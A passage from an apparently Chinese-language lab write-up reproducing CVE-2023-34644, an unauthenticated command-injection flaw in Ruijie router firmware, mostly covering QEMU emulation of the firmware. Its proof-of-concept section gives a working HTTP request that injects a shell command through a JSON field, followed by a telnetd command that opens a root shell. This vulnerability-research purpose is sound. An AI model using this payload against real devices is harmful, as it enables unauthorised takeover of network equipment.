<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132602001.png" alt="image-20250214132602001"></p>
<p>跟进，也就是在这里，触发命令执行，且没有做任何过滤</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214132723831.png" alt="image-20250214132723831"></p>
<p>这里面又用 popen() 通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以运行命令来开启一个进程，至此，该未授权 RCE 漏洞的调用链分析完毕</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214133022928.png" alt="image-20250214133022928"></p>
<h2>7.设备仿真</h2>
<p>目前比较常用的 FirmAE，EMUX，firmware-analysis-plus 仿真工具都存在各种问题，又因为该型号的固件是 mipsel 架构的，可以使用 qemu-system 直接进行仿真模拟</p>
<p>这里下载内核和文件系统：</p>
<pre><code>wget https://people.debian.org/\~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
wget https://people.debian.org/\~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2 
</code></pre>
<p>qemu 启动脚本 <a href="http://start.sh">start.sh</a>:</p>
<p>这里设定了 cpu 为 74kf，因为若不特别说明，默认是 24Kc，而该固件需要较高版本的 cpu，不然在之后 chroot 切换根目录的时候就会出现 Illegal instruction（非法指令）错误。可用 qemu-system-mipsel -cpu help 命令查看 qemu-system-mipsel 所有支持的 cpu 版本</p>
<pre><code class="language-shell">#!/bin/bash
 
sudo qemu-system-mipsel \
    -cpu 74Kf \
    -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_squeeze_mipsel_standard.qcow2 \
    -append &quot;root=/dev/sda1 console=tty0&quot; \
    -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
</code></pre>
<p>在仿真开始之前，我们还需要对进行相关的网络配置，以便宿主机可以与 qemu 进行网络通信（因为我们需要将路由器的文件系统上传到 QEMU 虚拟机）</p>
<p>通信的大概原理是创建一个虚拟的网桥，并且开一个接口给 qemu，然后流量的发送都是通过这个网桥</p>
<p>宿主机先安装依赖，用来配置网络</p>
<pre><code class="language-shell">sudo apt-get install bridge-utils uml-utilities
</code></pre>
<p>创建一个 <a href="http://net.sh">net.sh</a>: 赋予执行权限并运行</p>
<pre><code class="language-shell">#!/bin/sh
sudo brctl addbr br0                   # 添加一个名为 br0 的网桥
sudo ifconfig br0 192.168.2.3/24 up    # 启用 br0 接口
sudo tunctl -t tap0 -u root            # 创建一个只许 root 访问的 tap0 接口
sudo ifconfig tap0 192.168.2.1/24 up   # 启用 tap0 接口
sudo brctl addif br0 tap0              # 在虚拟网桥中增加一个 tap0 接口
</code></pre>
<p>配置成功后，使用 ifconfig 命令，会发现主机多出两个虚拟网卡 <code>br0</code> 和 <code>tap0</code></p>
<p>如果不需要了，使用如下的脚本即可取消配置 unset_net.sh:</p>
<pre><code class="language-shell">#!/bin/sh
sudo ifconfig br0 down # 关闭设备
sudo ifconfig tap0 down # 关闭设备
sudo brctl delbr br0 # 删除网桥
sudo tunctl -d tap0 # 删除网卡
</code></pre>
<p>接下来，在 qemu 里面使用命令 <code>ifconfig eth0 192.168.2.2/24 up</code> 即可配置成功，接下来可以使用 <code>ping</code> 命令检查一下是否网络互通</p>
<p>启动 <a href="http://start.sh">start.sh</a> 脚本，账号密码都是 root。先按 ctrl + a， 释放之后再按 x 就可以停止了</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214140608155.png" alt="image-20250214140608155"></p>
<p>接下里，还需要将路由器的文件系统上传到 qemu 虚拟机当中，让 qemu 虚拟机来启动路由器</p>
<p>先将文件系统用 <code>tar</code> 进行压缩打包，然后使用 <code>scp</code> 命令传到 qemu 虚拟机当中，再将文件系统解压</p>
<p>接着，进入解压的文件系统，这里 chmod 给全部文件都赋予所有权限，是为了方便在仿真过程中不用再考虑权限问题的影响了。之后使用 mount 将/proc 和/dev 系统目录挂载到 rootfs 中的 proc 和 dev 目录（仿真系统只是切换了根目录，本质还是 qemu 虚拟机的系统，故 proc 和 dev 这两个特殊的虚拟文件夹（用于提供系统信息和设备的访问）仍应该是这个系统本身的目录，即 qemu 虚拟机的系统目录，而切换了根目录后，proc 和 dev 也被切换，因此需要挂载为原先的目录），最后用 chroot 将 rootfs 切换为根目录，完成准备工作</p>
<pre><code class="language-shell">cd rootfs
chmod -R 777 ./
mount --bind /proc proc
mount --bind /dev dev
chroot . /bin/sh
</code></pre>
<p>对于 OpenWRT 来说，内核加载完文件系统后，首先会启动 <code>/sbin/init</code> 进程，其中会进一步执行 <code>/etc/preinit和/sbin/procd</code>，进行初步初始化。这当然也是仿真模拟的第一步，启动 <code>/sbin/init</code> 后，会卡住挂在进程中，我们可以再 ssh 开一个新窗口进行后续操作，也可以用 <code>/sbin/init &amp;</code> 将其作为后台进程执行</p>
<p>接着，真实系统会根据 <code>/etc/inittab</code> 中按编号次序执行 <code>/etc/rc.d</code> 中的初始化脚本，而 <code>/etc/rc.d</code> 中的文件都是 <code>/etc/init.d</code> 中对应文件的软链接</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214220728283.png" alt="image-20250214220728283"></p>
<p>由于此次仿真我们仅需要验证我们的漏洞，所以我们进行部分仿真即可</p>
<p>首先，我们需要启动 httpd 服务，对应着/etc/init.d/lighttpd 初始化脚本，启动：</p>
<pre><code class="language-shell">/etc/init.d/lighttpd start
</code></pre>
<p>会出现缺失文件报错：</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214153639777.png" alt="image-20250214153639777"></p>
<p>由于是部分仿真的，没有按照次序，故之前没有创建这个文件，而通过查看该初始化脚本，可以发现此处/rom/etc/lighttpd/lighttpd.conf 的缺失并无影响。因此，创建/var/run/lighttpd.pid 空文件后，再次 <code>/etc/init.d/lighttpd start</code> 启动服务即可</p>
<pre><code class="language-shell">mkdir /var/run/lighttpd.pid
</code></pre>
<p>此时，我们可以看到进程当中成功启动了 lighttpd 进程</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214153608765.png" alt="image-20250214153608765"></p>
<p>并且此时，我们可以正常通过游览器访问其 api 接口</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214153729258.png" alt="image-20250214153729258"></p>
<p>接下来，需要启动需要启动 <code>nifyframe-sgi.elf</code>，对应 <code>/etc/init.d/unifyframe-sgi</code>的初始化脚本。用 <code>/etc/init.d/unifyframe-sgi start</code>直接启动后也会出现报错</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214153809912.png" alt="image-20250214153809912"></p>
<p>因为 <code>unifyframe-sgi.elf</code>中用到了ubus总线进行进程间通信，因此需要先执行 <code>/sbin/ubusd</code>启动ubus通信，才能启动 <code>uf_ubus_call.elf</code>，继而才能再启动 <code>unifyframe-sgi.elf</code></p>
<pre><code class="language-shell">/sbin/ubusd &amp;
</code></pre>
<p>后面又会报一个 <code>segment fault</code>，是由于缺少文件导致的，这里复制一个就好了</p>
<pre><code class="language-shell">mkdir /tmp/coredump
mkdir /tmp/rg_device
cp /sbin/hw/60010081/rg_device.json  /tmp/rg_device/rg_device.json
/usr/sbin/unifyframe-sgi.elf
</code></pre>
<p>此时进程中的 <code>/usr/sbin/unifyframe-sgi.elf</code>程序才在运行</p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214155605401.png" alt=""></p>
<p>总结下来，也就是下面的命令，解决相关报错和设备仿真：</p>
<pre><code class="language-shell">tar czf rootfs.tar.gz ./rootfs
scp rootfs.tar.gz root@192.168.2.2:/root/rootfs
cd rootfs
chmod -R 777 ./
mount -bind /proc proc
mount -bind /dev dev
chroot . /bin/sh
/sbin/init
mkdir /var/run/lighttpd.pid
/etc/init.d/lighttpd start
/sbin/ubusd &amp;

mkdir /tmp/coredump
mkdir /tmp/rg_device
cp /sbin/hw/60010081/rg_device.json  /tmp/rg_device/rg_device.json
/usr/sbin/unifyframe-sgi.elf
</code></pre>
<h2>8.poc验证</h2>
<pre><code>POST /cgi-bin/luci/api/auth HTTP/1.1

Host: 192.168.2.2

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Content-Length: 66



{&quot;method&quot;: &quot;merge&quot;, &quot;params&quot;: {&quot;foo&quot;: &quot;'`ls / &gt; /www/hack.txt`'&quot;}}
</code></pre>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214161019987.png" alt="image-20250214161019987"></p>
<p><img src="/0101/IOT/Practice/RuiJie/assets/CVE-2023-34644%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/image-20250214161033551.png" alt="image-20250214161033551"></p>
<p>此外，<code>telnetd</code> 是 <code>busybox</code> 程序中集成的一个服务，所以在嵌入式设备中一般都可以进行开启</p>
<pre><code class="language-shell">telnetd -p 23090 -l /bin/sh
</code></pre>
<p>我们也可以这样获得一个shell</p>

        </main>
    </div>
</body>
</html>